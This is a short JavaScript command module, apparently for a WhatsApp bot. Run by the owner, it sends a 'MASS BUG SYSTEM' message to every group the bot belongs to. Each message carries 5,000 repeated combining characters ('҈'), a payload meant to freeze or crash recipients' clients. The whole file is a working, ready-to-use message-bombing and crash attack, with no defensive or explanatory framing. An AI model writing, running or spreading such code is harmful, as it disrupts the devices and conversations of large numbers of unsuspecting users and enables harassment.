module.exports = async function(sock, from, msg, isOwner, q, isAdmin, session) {
    if (!isOwner) return await sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        const chats = Object.keys(sock.chats || {});
        const groups = chats.filter(v => v.endsWith('@g.us'));
        
        if (groups.length === 0) {
            return await sock.sendMessage(from, { text: '⚠️ No groups found to send bugs!' }, { quoted: msg });
        }

        await sock.sendMessage(from, { text: `🚀 *Initiating Mass Bug to ${groups.length} groups...*` }, { quoted: msg });

        const payload = "҈".repeat(5000);

        for (const group of groups) {
            try {
                await sock.sendMessage(group, { text: "🚀 MASS BUG SYSTEM 🚀\n" + payload });
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (e) {}
        }

        await sock.sendMessage(from, { text: '✅ *Mass Bug sequence completed!*' }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(from, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
};
